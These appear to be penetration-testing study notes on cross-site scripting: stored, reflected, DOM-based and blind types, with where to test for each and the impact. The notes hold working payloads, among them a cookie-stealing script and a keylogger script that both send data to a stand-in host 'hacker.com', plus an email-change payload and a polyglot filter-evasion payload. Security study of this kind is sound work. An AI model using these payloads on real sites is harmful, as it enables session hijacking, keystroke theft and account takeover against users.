# PoC Payload: <script>alert('XSS');</script>

## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings

### Session stealing: <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>

### Keylogger: <script>document.onkeypress = function(p){ fetch ('https://hacker.com/log?key=' + btoa(p.key) );}</script>

### Change user's email address: <script>user.changeEmail('attacker@hacker.com');</script>

# Stored XSS

## Test locations: 

#### 1: Comments on a blog

#### 2: User profile information

#### 3: Website listings

## IMPACT:

#### Steal victim's session cookie. Impersonate the visiting user.

# Reflected XSS

## Test locations:

#### 1: URL file path

#### 2: Parameters in the URL query string

#### 3: Sometimes, HTTP headers

## IMPACT:

#### Attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session/customer information.

# DOM Based XSS

## Test locations:

#### 1: Look for parts of the code that access certain variables that we can have control over.

#### E.g. "window.location.x" parameter.

#### When we've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as "eval()"

## IMPACT:

#### Steal content from page/user's session. Crafted links could be sent to victims, redirecting them to another site.

# BLIND XSS 

## Test locations:

#### Ensure payload has a call back (HTTP request) 

# POLYGLOT PAYLOAD

#### jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
